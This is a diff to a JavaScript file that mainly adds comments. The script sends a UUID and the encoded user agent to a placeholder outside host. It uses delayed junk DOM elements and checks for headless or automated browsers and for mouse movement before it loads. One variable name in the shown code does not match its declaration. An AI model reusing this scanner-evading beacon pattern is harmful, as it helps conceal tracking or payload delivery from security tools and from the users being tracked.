@@ -8,10 +8,11 @@ function delay(time) {
     return new Promise(resolve => setTimeout(resolve, time));
 }
 
-// Tracker request 
+// Tracker request
 function trck() {
     let uuid = crypto.randomUUID();
     let uagent = btoa(navigator.userAgent);
+    // JSON object for if we want to use POST
     /** let postObj = { 
         id: "test", 
         title: "hello", 
@@ -22,33 +23,46 @@ function trck() {
     const trackUrl = `https://hooksite.blahhhhh?UUID=${uuid}&UserAgent=${uagent}`;
     let xhr = new XMLHttpRequest();
     xhr.open('GET', trackUrl, true);
+    // header for if we decide to send our json data
     //xhr.setRequestHeader('Content-type', 'application/json; charset=UTF-8')
     xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
     xhr.send();
 }
 
-// Function hopper/junk block. This is used to pollute a little and then run the rest. 
+/**
+* Function hopper/junk block. This is used to pollute a little and then run the rest. 
+*/
+
 function n() {
+    // make an img element
     var daImg = document.createElement("img");
     document.body.appendChild(daImg);
+    // run the tracking function
     trck();
 }
 
 function y() {
+    // make a bogus script element
     var daScript = document.createElement("script");
     document.body.appendChild(daScript);
+    // jump to function n()
     delay(100).then(() => n());
 }
 
 function s() {
+    // make an extra div element
     var daDi2v = document.createElement("div");
     document.body.appendChild(daDiv2);
+    // jump to function y()
     delay(100).then(() => y());
 }
 
 function hopper() {
     delay(500).then(() => s());
 }
+/**
+* ~End function block~
+*/
 
 // function to attempt building stuff
 function domBuild() {
@@ -67,10 +81,11 @@ function domBuild() {
     }
 }
 
-//navigator check
+//navigator/browser check
 function navcheck(){
     // check if cookies are enabled
     // check if the UA is set via automation or headless
+    // See: https://developer.mozilla.org/en-US/docs/Web/API/Navigator/webdriver
     if (navigator.cookieEnabled && navigator.webdriver == false){
         console.log('ayy')
         mousechk();
@@ -86,6 +101,7 @@ function mousechk() {
     // if the user moves the mouse, delay and load
     var moved = false
     window.onmousemove = function (e) {
+        // if the mouse moved set to true and continue
         if (!moved) {
             moved = true;
             // delay just a sec 
